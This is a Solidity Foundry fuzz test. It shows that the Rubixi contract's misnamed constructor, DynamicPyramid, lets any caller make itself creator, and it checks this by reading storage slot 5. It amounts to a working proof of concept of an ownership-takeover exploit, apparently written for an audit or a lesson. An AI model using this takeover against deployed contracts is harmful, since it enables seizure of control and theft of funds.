
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {Rubixi} from "../src/Rubixi.sol";

contract TestAccessControlRubixi is Test {
    Rubixi rubixi;

    function setUp() public {
        rubixi = new Rubixi();
    }

    function test_highlightArbitraryUserCanAccess(address caller) public {
        
        // --- 1. Constraints ---
        vm.assume(caller != address(this));
        vm.assume(caller != address(0));
        vm.assume(caller != address(vm)); 
        vm.assume(caller != 0x000000000000000000636F6e736F6c652e6c6f67);
        
        // --- 3. Execution & Assertion ---
        
        vm.prank(caller);

        // The DynamicPyramid function was intended to be a constructor but is a public function due to a naming mismatch (Rubixi vs DynamicPyramid).
        // This allows any user to call it and claim ownership (creator status).
        rubixi.DynamicPyramid();
        
        // Verify side effect: caller is now the creator.
        // Storage Layout Analysis:
        // Slot 0: balance (uint)
        // Slot 1: collectedFees (uint)
        // Slot 2: feePercent (uint)
        // Slot 3: pyramidMultiplier (uint)
        // Slot 4: payoutOrder (uint)
        // Slot 5: creator (address)
        bytes32 creatorSlot = vm.load(address(rubixi), bytes32(uint256(5)));
        address storedCreator = address(uint160(uint256(creatorSlot)));
        
        assertEq(storedCreator, caller, "Caller should have successfully overwritten the creator address");
    }
}
